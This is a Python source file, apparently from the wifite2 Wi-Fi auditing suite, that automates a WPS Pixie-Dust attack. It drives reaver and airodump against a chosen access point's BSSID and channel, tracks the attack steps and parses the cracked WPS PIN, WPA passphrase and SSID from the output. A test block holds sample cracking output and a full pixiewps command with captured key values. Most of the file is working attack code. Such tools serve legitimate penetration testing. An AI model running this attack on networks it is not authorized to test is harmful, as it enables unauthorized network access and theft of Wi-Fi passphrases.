#!/usr/bin/python2.7
# -*- coding: utf-8 -*-

from Attack import Attack
from Airodump import Airodump
from Color import Color
from Configuration import Configuration
from CrackResultWPS import CrackResultWPS
from Process import Process

import os, time, re

class Reaver(Attack):
    def __init__(self, target):
        super(Reaver, self).__init__(target)
        self.success = False
        self.crack_result = None

    def is_pixiedust_supported(self):
        ''' Checks if 'reaver' supports WPS Pixie-Dust attack '''
        output = Process(['reaver', '-h']).stderr()
        return '--pixie-dust' in output

    def run_pixiedust_attack(self):
        # Write reaver stdout to file.
        self.stdout_file = Configuration.temp('reaver.out')
        if os.path.exists(self.stdout_file):
            os.remove(self.stdout_file)

        command = [
            'reaver',
            '--interface', Configuration.interface,
            '--bssid', self.target.bssid,
            '--channel', self.target.channel,
            '--pixie-dust', '1', # pixie-dust attack
            #'--delay', '0',
            #'--no-nacks',
            '--session', '/dev/null', # Don't restart session
            '-vv' # (very) verbose
        ]
        stdout_write = open(self.stdout_file, 'a')
        reaver = Process(command, stdout=stdout_write, stderr=Process.devnull())

        pin = None
        step = 'initializing'
        time_since_last_step = 0

        with Airodump(channel=self.target.channel,
                      target_bssid=self.target.bssid,
                      skip_wps=True,
                      output_file_prefix='pixie') as airodump:

            Color.clear_line()
            Color.pattack("WPS", self.target, "Pixie Dust", "Waiting for target to appear...")

            while True:
                try:
                    airodump_target = self.wait_for_target(airodump)
                except Exception as e:
                    Color.pattack("WPS", self.target, "Pixie-Dust", "{R}failed: {O}%s{W}" % e)
                    Color.pl("")
                    return False

                stdout_write.flush()

                # Check output from reaver process
                stdout = self.get_stdout()
                stdout_last_line = stdout.split('\n')[-1]

                (pin, psk, ssid) = self.get_pin_psk_ssid(stdout)

                # Check if we cracked it, or if process stopped.
                if pin is not None or reaver.poll() is not None:
                    reaver.interrupt()

                    # Check one-last-time for PIN/PSK/SSID, in case of race condition.
                    stdout = self.get_stdout()
                    (pin, psk, ssid) = Reaver.get_pin_psk_ssid(stdout)

                    # Check if we cracked it.
                    if pin is not None:
                        # We cracked it.
                        bssid = self.target.bssid
                        Color.clear_entire_line()
                        Color.pattack("WPS", airodump_target, "Pixie-Dust", "{G}successfully cracked WPS PIN and PSK{W}")
                        Color.pl("")
                        self.crack_result = CrackResultWPS(bssid, ssid, pin, psk)
                        self.crack_result.dump()
                        return True
                    else:
                        # Failed to crack, reaver proces ended.
                        Color.clear_line()
                        Color.pattack("WPS", airodump_target, "Pixie-Dust", "{R}Failed: {O}WPS PIN not found{W}\n")
                        return False

                if 'WPS pin not found' in stdout:
                    Color.pl('{R}failed: {O}WPS pin not found{W}')
                    break

                last_step = step
                # Status updates, depending on last line of stdout
                if 'Waiting for beacon from' in stdout_last_line:
                    step = '({C}step 1/8{W}) waiting for beacon'
                elif 'Associated with' in stdout_last_line:
                    step = '({C}step 2/8{W}) waiting to start session'
                elif 'Starting Cracking Session.' in stdout_last_line:
                    step = '({C}step 3/8{W}) waiting to try pin'
                elif 'Trying pin' in stdout_last_line:
                    step = '({C}step 4/8{W}) trying pin'
                elif 'Sending EAPOL START request' in stdout_last_line:
                    step = '({C}step 5/8{W}) sending eapol start request'
                elif 'Sending identity response' in stdout_last_line:
                    step = '({C}step 6/8{W}) sending identity response'
                elif 'Sending M2 message' in stdout_last_line:
                    step = '({C}step 7/8{W}) sending m2 message (may take a while)'
                elif 'Detected AP rate limiting,' in stdout_last_line:
                    if Configuration.wps_skip_rate_limit:
                        Color.pl('{R}failed: {O}hit WPS rate-limit{W}')
                        Color.pl('{!} {O}use {R}--ignore-ratelimit{O} to ignore' +
                                 ' this kind of failure in the future{W}')
                        break
                    step = '({C}step -/8{W}) waiting for AP rate limit'

                if step != last_step:
                    # Step changed, reset step timer
                    time_since_last_step = 0
                else:
                    time_since_last_step += 1

                if time_since_last_step > Configuration.wps_pixie_step_timeout:
                    Color.pl('{R}failed: {O}step-timeout after %d seconds{W}' % Configuration.wps_pixie_step_timeout)
                    break

                # TODO: Timeout check
                if reaver.running_time() > Configuration.wps_pixie_timeout:
                    Color.pl('{R}failed: {O}timeout after %d seconds{W}' % Configuration.wps_pixie_timeout)
                    break

                # Reaver Failure/Timeout check
                fail_count = stdout.count('WPS transaction failed')
                if fail_count > Configuration.wps_fail_threshold:
                    Color.pl('{R}failed: {O}too many failures (%d){W}' % fail_count)
                    break
                timeout_count = stdout.count('Receive timeout occurred')
                if timeout_count > Configuration.wps_timeout_threshold:
                    Color.pl('{R}failed: {O}too many timeouts (%d){W}' % timeout_count)
                    break

                Color.clear_line()
                Color.pattack("WPS", airodump_target, "Pixie-Dust", step)

                time.sleep(1)
                continue

        # Attack failed, already printed reason why
        reaver.interrupt()
        stdout_write.close()
        return False

    @staticmethod
    def get_pin_psk_ssid(stdout):
        ''' Parses WPS PIN, PSK, and SSID from output '''
        pin = psk = ssid = None

        # Check for PIN.
        '''  [+] WPS pin:  11867722'''
        regex = re.search(r"WPS pin:\s*([0-9]*)", stdout, re.IGNORECASE)
        if regex:
            pin = regex.group(1)

        # Check for PSK.
        # Note: Reaver 1.6.x does not appear to return PSK (?)
        regex = re.search("WPA PSK: *'(.+)'", stdout)
        if regex:
            psk = regex.group(1)

        # Check for SSID
        """1.x [Reaver Test] [+] AP SSID: 'Test Router' """
        regex = re.search(r"AP SSID:\s*'(.*)'", stdout)
        if regex:
            ssid = regex.group(1)

        # Check (again) for SSID
        if ssid is None:
            """1.6.x [+] Associated with EC:1A:59:37:70:0E (ESSID: belkin.00e)"""
            regex = re.search(r"Associated with [0-9A-F:]+ \(ESSID: (.*)\)", stdout)
            if regex:
                ssid = regex.group(1)

        return (pin, psk, ssid)

    def get_stdout(self):
        ''' Gets output from stdout_file '''
        if not self.stdout_file:
            return ''
        with open(self.stdout_file, 'r') as fid:
            stdout = fid.read()
        return stdout.strip()


if __name__ == '__main__':
    old_stdout = '''
[Pixie-Dust]
[Pixie-Dust]   Pixiewps 1.1
[Pixie-Dust]
[Pixie-Dust]   [*] E-S1:       00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
[Pixie-Dust]   [*] E-S2:       00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
[Pixie-Dust]   [+] WPS pin:    12345678
[Pixie-Dust]
[Pixie-Dust]   [*] Time taken: 0 s
[Pixie-Dust]
Running reaver with the correct pin, wait ...
Cmd : reaver -i wlan0mon -b 08:86:3B:8C:FD:9C -c 11 -s y -vv -p 28097402

[Reaver Test] BSSID: AA:BB:CC:DD:EE:FF
[Reaver Test] Channel: 11
[Reaver Test] [+] WPS PIN: '12345678'
[Reaver Test] [+] WPA PSK: 'Test PSK'
[Reaver Test] [+] AP SSID: 'Test Router'
'''

    # From vom513 in https://github.com/derv82/wifite2/issues/60
    new_stdout = '''
[+] Switching wlan1mon to channel 5
[+] Waiting for beacon from EC:1A:59:37:70:0E
[+] Received beacon from EC:1A:59:37:70:0E
[+] Vendor: RealtekS
[+] Trying pin "12345670"
[+] Sending authentication request
[+] Sending association request
[+] Associated with EC:1A:59:37:70:0E (ESSID: belkin.00e)
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[+] Received M1 message
[+] Sending M2 message

 Pixiewps 1.4

 [?] Mode:     3 (RTL819x)
 [*] Seed N1:  -
 [*] Seed ES1: -
 [*] Seed ES2: -
 [*] PSK1:     2c2e33f5e3a870759f0aeebbd2792450
 [*] PSK2:     3f4ca4ea81b2e8d233a4b80f9d09805d
 [*] ES1:      04d48dc20ec785762ce1a21a50bc46c2
 [*] ES2:      04d48dc20ec785762ce1a21a50bc46c2
 [+] WPS pin:  11867722

 [*] Time taken: 0 s 21 ms

executing pixiewps -e d0141b15656e96b85fcead2e8e76330d2b1ac1576bb026e7a328c0e1baf8cf91664371174c08ee12ec92b0519c54879f21255be5a8770e1fa1880470ef423c90e34d7847a6fcb4924563d1af1db0c481ead9852c519bf1dd429c163951cf69181b132aea2a3684caf35bc54aca1b20c88bb3b7339ff7d56e09139d77f0ac58079097938251dbbe75e86715cc6b7c0ca945fa8dd8d661beb73b414032798dadee32b5dd61bf105f18d89217760b75c5d966a5a490472ceba9e3b4224f3d89fb2b -s 5a67001334e3e4cb236f4e134a4d3b48d625a648e991f978d9aca879469d5da5 -z c8a2ccc5fb6dc4f4d69b245091022dc7e998e42ec1d548d57c35a312ff63ef20 -a 60b59c0c587c6c44007f7081c3372489febbe810a97483f5cc5cd8463c3920de -n 04d48dc20ec785762ce1a21a50bc46c2 -r 7a191e22a7b519f40d3af21b93a21d4f837718b45063a8a69ac6d16c6e5203477c18036ca01e9e56d0322e70c2e1baa66518f1b46d01acc577d1dfa34efd2e9ee36e2b7e68819cddacceb596a8895243e33cb48c570458a539dcb523a4d4c4360e158c29b882f7f385821ea043705eb56538b45daa445157c84e60fc94ef48136eb4e9725b134902b96c90b1ae54cbd42b29b52611903fdae5aa88bfc320f173d2bbe31df4996ebdb51342c6b8bd4e82ae5aa80b2a09a8bf8faa9a8332dc9819
'''
    (pin, psk, ssid) = Reaver.get_pin_psk_ssid(old_stdout)
    assert pin  == '12345678',    'pin was "%s", should have been "12345678"' % pin
    assert psk  == 'Test PSK',    'psk was "%s", should have been "Test PSK"' % psk
    assert ssid == "Test Router", 'ssid was %s, should have been Test Router' % repr(ssid)
    result = CrackResultWPS('AA:BB:CC:DD:EE:FF', ssid, pin, psk)
    result.dump()

    print ""

    (pin, psk, ssid) = Reaver.get_pin_psk_ssid(new_stdout)
    assert pin  == '11867722',   'pin was "%s", should have been "11867722"' % pin
    assert psk  == None,         'psk was "%s", should have been "None"' % psk
    assert ssid == "belkin.00e", 'ssid was "%s", should have been "belkin.00e"' % repr(ssid)
    result = CrackResultWPS('AA:BB:CC:DD:EE:FF', ssid, pin, psk)
    result.dump()
